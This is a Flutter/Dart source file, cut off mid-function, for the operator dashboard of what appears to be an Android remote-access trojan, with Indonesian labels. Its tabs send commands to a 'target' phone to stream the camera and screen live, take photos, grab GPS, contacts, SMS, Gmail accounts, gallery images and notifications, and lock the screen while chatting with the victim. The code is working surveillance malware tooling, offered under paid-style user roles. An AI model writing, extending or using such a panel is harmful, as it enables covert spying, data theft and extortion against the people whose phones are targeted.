import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:video_player/video_player.dart';
import 'srv.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── Constants ──────────────────────────────────────────────────────────────
  static const _kBg        = Color(0xFF0A0A0F);
  static const _kSurface   = Color(0xFF14141A);
  static const _kCard      = Color(0xFF14141A);
  static const _kText      = Colors.black87;
  static const _kSub       = Colors.black54;
  static const _kAccent    = Color(0xFFFF5252);
  static const _kBorder    = Color(0xFFFF5252);
  static const _kRed       = Color(0xFFD32F2F);
  static const _kGreen     = Color(0xFF388E3C);
  static const _kBlue      = Color(0xFF1976D2);
  static const _kOrng      = Color(0xFFF57C00);
  static const _kPurp      = Color(0xFFC62828);
  static const _kCyan      = Color(0xFFC62828);
  static const _kBlack     = Colors.black;
  static const _kDeveloper = Color(0xFF6A1B9A);

  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  bool get _isDeveloper => widget.role.toLowerCase() == 'developer';
  bool get _isOwnerOrAbove =>
      ['developer', 'owner'].contains(widget.role.toLowerCase());
  bool get _isHighRole =>
      ['developer', 'owner', 'admin', 'moderator', 'vip']
          .contains(widget.role.toLowerCase());
  String get _chatFrom => _isDeveloper ? 'developer' : 'owner';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        if (mounted) {
          setState(() => _videoInitialized = true);
          _videoController.setLooping(true);
          _videoController.setVolume(0);
          _videoController.play();
        }
      });
  }

  @override
  void dispose() {
    _videoController.dispose();
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _kRed}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m,
          style: const TextStyle(
              fontWeight: FontWeight.w600, fontSize: 13, color: Colors.white)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
    ));
  }

  // ── SEND COMMAND ───────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http
          .post(
            Uri.parse('${Srv.baseUrl}/api/send-command'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
          )
          .timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: _kGreen);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline');
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Koneksi gagal');
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ── POLL RESPONSE ──────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('${Srv.baseUrl}/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('Foto kosong');
          return;
        }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ── LIVE STREAM ────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('${Srv.baseUrl}/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) {
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    }
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ── CHAT ───────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('${Srv.baseUrl}/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? ''
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': _chatFrom,
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http
          .post(
            Uri.parse('${Srv.baseUrl}/api/lock-chat/$_id'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'text': text.trim(),
              'from': _chatFrom,
            }),
          )
          .timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ── BUILD ──────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        automaticallyImplyLeading: false,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: _kBlack, size: 20),
          onPressed: () {
            if (_liveOn) _stopLive();
            Navigator.pop(context);
          },
        ),
        actions: [
          if (_liveOn)
            Container(
              margin: const EdgeInsets.symmetric(vertical: 13, horizontal: 4),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 3),
              decoration: BoxDecoration(
                color: _kRed.withOpacity(0.1),
                borderRadius: BorderRadius.zero,
                border: Border.all(color: _kBlack, width: 1.5),
                boxShadow: const [
                  BoxShadow(
                      color: Colors.black, blurRadius: 0, offset: Offset(2, 2))
                ],
              ),
              child: Row(mainAxisSize: MainAxisSize.min, children: [
                Container(
                    width: 6,
                    height: 6,
                    decoration: const BoxDecoration(
                        color: _kRed, shape: BoxShape.circle)),
                const SizedBox(width: 5),
                Text('$_fps fps',
                    style: const TextStyle(
                        color: _kRed,
                        fontSize: 11,
                        fontWeight: FontWeight.bold)),
              ]),
            ),
          if (_sending)
            const Padding(
                padding: EdgeInsets.only(right: 10),
                child: Center(
                    child: SizedBox(
                        width: 18,
                        height: 18,
                        child: CircularProgressIndicator(
                            strokeWidth: 2, color: _kAccent)))),
          IconButton(
              icon: const Icon(Icons.refresh_rounded, color: _kBlack, size: 20),
              onPressed: () {
                setState(() {});
                _cmd('force_open', silent: true);
              }),
        ],
        bottom: TabBar(
          controller: _tabs,
          isScrollable: true,
          indicatorColor: _kBlack,
          indicatorWeight: 2.5,
          labelColor: _kBlack,
          unselectedLabelColor: _kSub,
          labelStyle: const TextStyle(
              fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 0.5),
          unselectedLabelStyle: const TextStyle(fontSize: 11),
          tabs: const [
            Tab(text: 'Live Stream'),
            Tab(text: 'Camera'),
            Tab(text: 'Intelligence'),
            Tab(text: 'Audio'),
            Tab(text: 'Lock & Chat'),
            Tab(text: 'Device'),
          ],
        ),
      ),
      body: Column(children: [
        _buildVideoBanner(),
        Expanded(
            child: TabBarView(controller: _tabs, children: [
          _pageLive(),
          _pageCamera(),
          _pageIntel(),
          _pageAudio(),
          _pageLock(),
          _pageDevice(),
        ])),
      ]),
    );
  }

  // ── VIDEO BANNER ───────────────────────────────────────────────────────────
  Widget _buildVideoBanner() {
    return Container(
      height: 130,
      width: double.infinity,
      decoration: const BoxDecoration(
        border: Border(bottom: BorderSide(color: _kBlack, width: 2.5)),
      ),
      child: Stack(
        fit: StackFit.expand,
        children: [
          if (_videoInitialized)
            ClipRRect(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: _kAccent),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Colors.black.withOpacity(0.4),
                  Colors.black.withOpacity(0.65),
                ],
              ),
            ),
          ),
          Positioned(
            bottom: 14,
            left: 16,
            right: 16,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(_model,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 0.5,
                    )),
                const SizedBox(height: 6),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: _isDeveloper
                            ? _kDeveloper.withOpacity(0.9)
                            : Colors.white.withOpacity(0.2),
                        borderRadius: BorderRadius.zero,
                        border: Border.all(
                          color: Colors.white.withOpacity(0.45),
                          width: 1,
                        ),
                      ),
                      child: Text(
                        widget.role.toUpperCase(),
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 10,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.8,
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Container(
                      width: 7,
                      height: 7,
                      decoration: BoxDecoration(
                        color: _liveOn ? _kRed : _kGreen,
                        shape: BoxShape.circle,
                        border: Border.all(color: Colors.white, width: 1),
                      ),
                    ),
                    const SizedBox(width: 6),
                    Expanded(
                      child: Text(
                        'Battery: $_battery%  •  $_id',
                        style: const TextStyle(
                          color: Colors.white70,
                          fontSize: 11,
                          fontWeight: FontWeight.w500,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── TAB: LIVE ──────────────────────────────────────────────────────────────
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader('Live Stream', 'Real-time kamera dan layar HP target'),
        const SizedBox(height: 12),
        Container(
          height: _liveOn ? 220 : 90,
          decoration: BoxDecoration(
            color: _kSurface,
            borderRadius: BorderRadius.zero,
            border: Border.all(color: _kBlack, width: 1.5),
            boxShadow: const [
              BoxShadow(
                  color: Colors.black, blurRadius: 0, offset: Offset(4, 4)),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.zero,
            child: _liveOn && _frame != null
                ? Image.memory(_frame!,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    filterQuality: FilterQuality.low)
                : Center(
                    child: Text(
                        _liveOn ? 'Waiting for frames...' : 'Stream inactive',
                        style: const TextStyle(color: _kSub, fontSize: 11))),
          ),
        ),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(
              child: _menuBtn('Live Camera', _kRed, Icons.videocam_rounded, () {
            _showCamPicker((side) {
              _startLive('live_camera_start', side);
            });
          })),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn(
                  'Live Screen', _kBlue, Icons.desktop_windows_rounded, () {
            _startLive('live_screen_start', '');
          })),
        ]),
        if (_liveOn) ...[
          const SizedBox(height: 10),
          _menuBtn('Stop Live', _kSub, Icons.stop_rounded, _stopLive),
        ],
      ]);

  // ── TAB: CAMERA ────────────────────────────────────────────────────────────
  Widget _pageCamera() =>
      ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader(
            'Camera & Visual', 'Foto, screenshot, wallpaper, strobe'),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(
              child: _menuBtn('Take Photo', _kOrng, Icons.camera_alt_rounded,
                  () {
            _showCamPicker((s) => _cmd('take_photo', extra: s));
          })),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn('Screenshot', _kBlue, Icons.screenshot_monitor,
                  () => _cmd('get_screen'))),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(
              child: _menuBtn(
                  'Set Wallpaper', _kPurp, Icons.wallpaper_rounded, () {
            _inputDialog('Set Wallpaper', 'Image URL',
                (v) => _cmd('set_wallpaper', extra: v));
          })),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn('Strobe ON', _kOrng, Icons.flash_on_rounded,
                  () => _cmd('flash_strobe'))),
        ]),
        const SizedBox(height: 10),
        _menuBtn('Strobe OFF', _kSub, Icons.flash_off_rounded,
            () => _cmd('stop_strobe')),
      ]);

  // ── TAB: INTELLIGENCE ──────────────────────────────────────────────────────
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader('Intelligence', 'Data dan informasi dari HP target'),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(
              child: _menuBtn('Contacts', _kRed, Icons.contacts_rounded,
                  () => _cmd('get_contacts'))),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn('GPS Location', _kGreen, Icons.my_location_rounded,
                  () => _cmd('get_location'))),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(
              child: _menuBtn(
                  'Gmail & Accounts', _kBlue, Icons.account_circle_rounded,
                  () => _cmd('get_gmails'))),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn(
                  'SMS Inbox', _kCyan, Icons.sms_rounded, () => _cmd('get_sms'))),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(
              child: _menuBtn(
                  'Notifications', _kPurp, Icons.notifications_rounded,
                  () => _fetchNotif())),
          const SizedBox(width: 10),
          Expanded(
              child: _menuBtn('Gallery (5)', _kPurp, Icons.photo_library_rounded,
                  () => _cmd('get_gallery', extra: '5'))),
        ]),
        const SizedBox(height: 10),
        _menuBtn('Request Notif Access', _kSub, Icons.security_rounded,
            () => _cmd('open_notification_settings')),
      ]);

  // ── TAB: AUDIO / LOCK / DEVICE (minimal agar compile) ──────────────────────
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader('Audio', 'Kontrol suara target'),
        const SizedBox(height: 12),
        _menuBtn('Play Sound', _kOrng, Icons.volume_up_rounded,
            () => _cmd('play_sound')),
        const SizedBox(height: 10),
        _menuBtn('Stop Sound', _kSub, Icons.volume_off_rounded,
            () => _cmd('stop_sound')),
      ]);

  Widget _pageLock() => ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader('Lock & Chat', 'Kunci layar dan chat dengan target'),
        const SizedBox(height: 12),
        _menuBtn('Lock Screen', _kRed, Icons.lock_rounded,
            () => _cmd('lock_screen')),
        const SizedBox(height: 10),
        _menuBtn('Unlock Screen', _kGreen, Icons.lock_open_rounded,
            () => _cmd('unlock_screen')),
        const SizedBox(height: 16),
        // Simple chat area
        Container(
          height: 200,
          decoration: BoxDecoration(
            color: _kSurface,
            border: Border.all(color: _kBlack, width: 1.5),
          ),
          child: Column(
            children: [
              Expanded(
                child: ListView.builder(
                  controller: _chatScroll,
                  padding: const EdgeInsets.all(8),
                  itemCount: _chat.length,
                  itemBuilder: (_, i) {
                    final m = _chat[i];
                    final isMe = m['from'] == _chatFrom;
                    return Align(
                      alignment:
                          isMe ? Alignment.centerRight : Alignment.centerLeft,
                      child: Container(
                        margin: const EdgeInsets.symmetric(vertical: 3),
                        padding: const EdgeInsets.symmetric(
                            horizontal: 10, vertical: 6),
                        decoration: BoxDecoration(
                          color: isMe
                              ? _kAccent.withOpacity(0.15)
                              : _kCard,
                          border: Border.all(color: _kBlack, width: 1),
                        ),
                        child: Text(
                          '${m['from']}: ${m['text']}',
                          style: const TextStyle(fontSize: 12, color: _kText),
                        ),
                      ),
                    );
                  },
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(8),
                child: Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: _chatCtrl,
                        style: const TextStyle(fontSize: 13),
                        decoration: const InputDecoration(
                          hintText: 'Ketik pesan...',
                          isDense: true,
                          border: OutlineInputBorder(),
                        ),
                        onSubmitted: _sendChat,
                      ),
                    ),
                    const SizedBox(width: 8),
                    IconButton(
                      icon: const Icon(Icons.send, color: _kAccent),
                      onPressed: () => _sendChat(_chatCtrl.text),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ]);

  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(12), children: [
        _sectionHeader('Device', 'Info & kontrol device target'),
        const SizedBox(height: 12),
        _menuBtn('Force Open App', _kBlue, Icons.open_in_new_rounded,
            () => _cmd('force_open')),
        const SizedBox(height: 10),
        _menuBtn('Vibrate', _kOrng, Icons.vibration_rounded,
            () => _cmd('vibrate')),
        const SizedBox(height: 10),
        _menuBtn('Toast Message', _kPurp, Icons.message_rounded, () {
          _inputDialog('Kirim Toast', 'Pesan', (v) => _cmd('toast', extra: v));
        }),
      ]);

  // ── DIALOGS ────────────────────────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => AlertDialog(
          backgroundColor: _kSurface,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
          title: const Text('Select Camera',
              style: TextStyle(
                  color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () => ss(() => sel = v),
                child: Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 22, vertical: 14),
                  decoration: BoxDecoration(
                    color: isSel ? _kAccent.withOpacity(0.1) : Colors.transparent,
                    borderRadius: BorderRadius.zero,
                    border: Border.all(
                        color: isSel ? _kAccent : _kBlack.withOpacity(0.2)),
                  ),
                  child: Column(children: [
                    Icon(
                        v == 'back'
                            ? Icons.camera_rear_rounded
                            : Icons.camera_front_rounded,
                        color: isSel ? _kAccent : _kSub,
                        size: 28),
                    const SizedBox(height: 6),
                    Text(v == 'back' ? 'Back' : 'Front',
                        style: TextStyle(
                            color: isSel ? _kAccent : _kSub,
                            fontSize: 11,
                            fontWeight: FontWeight.w600)),
                  ]),
                ),
              );
            }).toList(),
          ),
          actions: [
            TextButton(
                onPressed: () => Navigator.pop(ctx),
                child: const Text('Cancel', style: TextStyle(color: _kSub))),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: _kAccent,
                shape: const RoundedRectangleBorder(
                    borderRadius: BorderRadius.zero),
              ),
              onPressed: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
              child: const Text('Select',
                  style: TextStyle(
                      color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ],
        ),
      ),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _kSurface,
        shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
        title: Text(title,
            style: const TextStyle(
                color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
        content: _field(ctrl, label, hint: hint, isNum: isNumber),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('Cancel', style: TextStyle(color: _kSub))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: _kAccent,
              shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero),
            ),
            onPressed: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
            child: const Text('Send',
                style:
                    TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  // ── DATA DISPLAY (FIXED parentheses) ───────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res =
          await http.get(Uri.parse('${Srv.baseUrl}/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: _kSurface,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.zero,
          ),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  height: 4,
                  width: 36,
                  margin: const EdgeInsets.only(top: 10, bottom: 8),
                  decoration: BoxDecoration(
                    color: _kBlack,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const Text('Notifications',
                    style: TextStyle(
                        color: _kText,
                        fontWeight: FontWeight.bold,
                        fontSize: 14)),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) =>
                        Divider(color: _kBlack.withOpacity(0.1), height: 1),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(
                          horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                          color: _kPurp.withOpacity(0.1),
                          borderRadius: BorderRadius.zero,
                          border: Border.all(color: _kBlack, width: 1),
                        ),
                        child: const Icon(Icons.notifications_rounded,
                            color: _kPurp, size: 18),
                      ),
                      title: Text(
                        list[i]['title']?.toString() ?? '-',
                        style: const TextStyle(
                            color: _kText,
                            fontSize: 13,
                            fontWeight: FontWeight.w600),
                      ),
                      subtitle: Text(
                        list[i]['body']?.toString() ?? '',
                        style: const TextStyle(color: _kSub, fontSize: 11),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(12),
          shape:
              const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Padding(
              padding: const EdgeInsets.all(14),
              child: Text(title,
                  style: const TextStyle(
                      color: _kText,
                      fontWeight: FontWeight.bold,
                      fontSize: 13)),
            ),
            ClipRRect(
              borderRadius: BorderRadius.zero,
              child: Image.memory(bytes, fit: BoxFit.contain),
            ),
          ]),
        ),
      );
    } catch (_) {
      _toast('Image decode failed');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _kSurface,
        shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
        title: const Text('GPS Location',
            style: TextStyle(
                color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Text('Latitude:  $lat',
              style: const TextStyle(
                  color: _kGreen,
                  fontFamily: 'monospace',
                  fontSize: 13,
                  fontWeight: FontWeight.w600)),
          const SizedBox(height: 4),
          Text('Longitude: $lng',
              style: const TextStyle(
                  color: _kGreen,
                  fontFamily: 'monospace',
                  fontSize: 13,
                  fontWeight: FontWeight.w600)),
        ]),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('Close', style: TextStyle(color: _kSub))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: _kGreen,
              shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero),
            ),
            onPressed: () => launchUrl(
              Uri.parse(
                  'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
            child: const Text('Open Maps',
                style:
                    TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _kSurface,
        shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
        title: Text(title,
            style: const TextStyle(
                color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: _kBg,
            borderRadius: BorderRadius.zero,
            border: Border.all(color: _kBlack, width: 1),
          ),
          child: SelectableText(content,
              style: const TextStyle(
                  color: _kGreen, fontFamily: 'monospace', fontSize: 12)),
        ),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('Close', style: TextStyle(color: _kSub))),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _kSurface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: _kBlack,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text('Contacts (${contacts.length})',
                style: const TextStyle(
                    color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) =>
                    Divider(color: _kBlack.withOpacity(0.1), height: 1),
                itemBuilder: (_, i) => ListTile(
